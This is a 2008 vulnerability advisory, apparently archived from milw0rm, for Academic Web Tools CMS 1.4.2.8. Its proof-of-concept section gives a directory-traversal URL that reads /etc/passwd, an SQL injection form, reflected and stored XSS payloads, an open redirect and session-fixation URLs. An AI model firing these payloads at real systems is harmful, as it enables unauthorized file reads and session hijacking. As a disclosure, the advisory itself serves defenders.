<html><head><title>Academic Web Tools CMS <= 1.4.2.8 Multiple Vulnerabilities</title></head><pre>########################## www.BugReport.ir #######################################
#
#        AmnPardaz Security Research Team
#
# Title: Academic Web Tools CMS Multiple Vulnerabilities
# Vendor: www.yektaweb.com
# Vulnerable Version: 1.4.2.8 and prior versions
# Exploit: Available
# Impact: Medium
# Fix: N/A
# Original Advisory: www.bugreport.ir/?/44
###################################################################################

####################
1. Description:
####################
    ACADEMIC WEB TOOLS (AWT) yektaweb is a Persian content management system (CMS) which can manage university conferences and journals too.
####################
2. Vulnerabilities:
####################
    2.1. Directory Traversal in &quot;/download.php&quot; in &quot;dfile&quot; parameter.
        2.1.1. Exploit:
                        Check the exploit/POC section.
    2.2. Injection Flaws. SQL Injection in &quot;/rating.php&quot; in &quot;book_id&quot; parameter.
        2.2.1. Exploit:
                        Check the exploit/POC section.
    2.3. Cross Site Scripting (XSS). Reflected XSS attack in &quot;/login.php&quot; in URL parameters.
        2.3.1. Exploit:
                        Check the exploit/POC section.
    2.4. Cross Site Scripting (XSS). Reflected XSS attack in &quot;/hta/htmlarea.js.php&quot; in &quot;glb_sid&quot; parameters.
        2.3.1. Exploit:
                        Check the exploit/POC section.
    2.5. Cross Site Scripting (XSS). Reflected redirect XSS attack in &quot;/rss_getfile.php&quot; in &quot;file&quot; parameters.
        2.4.1. Exploit:
                        Check the exploit/POC section.
    2.6. Cross Site Scripting (XSS). Stored XSS attack in &quot;/room.php&quot; chat service.
        2.5.1. Exploit:
                        Check the exploit/POC section.
    2.7. Session Management Flaw. &quot;/homepg/index.php&quot; and &quot;/homepg/login.php&quot; are vulnerable to session fixation.
        2.5.1. Exploit:
                        Check the exploit/POC section.
####################
3. Exploits/POCs:
####################
    Original Exploit URL: http://bugreport.ir/index.php?/44/exploit
    3.1. Directory Traversal in &quot;/download.php&quot; in &quot;dfile&quot; parameter.
        -------------
        http://[URL]/download.php?dfile=../../../../../../etc/passwd
        http://[URL]/download.php?dfile=../../../../../../../etc/crontab
        -------------
    3.2. SQL Injection in &quot;/rating.php&quot; in &quot;book_id&quot; parameter.
        -------------
        &lt;form action=&quot;http://[URL]/rating.php&quot; method=&quot;post&quot;&gt;
        &lt;input type=text name=book_id size=100 value=&quot;[SQL Injection]&quot;&gt;&lt;br&gt;
        &lt;input type=hidden name=user_score size=100 value=5&gt;
        &lt;input type=submit name=submit_for_rating value=&quot;Go!&quot;&gt;
        &lt;/form&gt;
        -------------
    3.3. Reflected XSS attack in &quot;/login.php&quot; in URL parameters.
        -------------
        http://[URL]/login.php?Fake=&lt;fake&gt;&lt;script&gt;alert(/sdl BugReport.IR xss/)&lt;/script&gt;
        -------------
    3.4. Reflected XSS attack in &quot;/hta/htmlarea.js.php&quot; in &quot;glb_sid&quot; parameters.
        -------------
        http://[URL]/hta/htmlarea.js.php?glb_sid=&lt;script&gt;alert(/sdl BugReport.IR xss/)&lt;/script&gt;
        -------------
    3.5. Reflected redirect XSS attack in &quot;rss_getfile.php&quot; in &quot;file&quot; parameters.
        -------------
        http://[URL]/rss_getfile.php?file=http://BugReport.ir
        -------------
    3.6. Reflected XSS attack in &quot;room.php&quot;.
        -------------
        First of all, login into the site.
        Now submit this : &lt;iframe src=&quot;http://www.BugReport.ir/&quot; width=1000 height=1000&gt;&lt;/iframe&gt;
        at: http://[URL]/room.php?slc_lang=fa&amp;sid=1&amp;user_id=1
        -------------
    3.7. &quot;/homepg/index.php&quot; and &quot;/homepg/login.php&quot; are vulnerable to session fixation.
        -------------
        First, clear the site's cookies, and then goto:
        http://[URL]/homepg/index.php?PHPSESSID=BugReportIRSessionFixation
        http://[URL]/homepg/login.php?PHPSESSID=BugReportIRSessionFixation
        -------------
####################
4. Solution:
####################
    Source codes are encrypted. Wait for vendor patch.
####################
5. Credit:
####################
AmnPardaz Security Research &amp; Penetration Testing Group
Contact: admin[4t}bugreport{d0t]ir
WwW.BugReport.ir
WwW.AmnPardaz.com

# milw0rm.com [2008-06-19]</pre></html>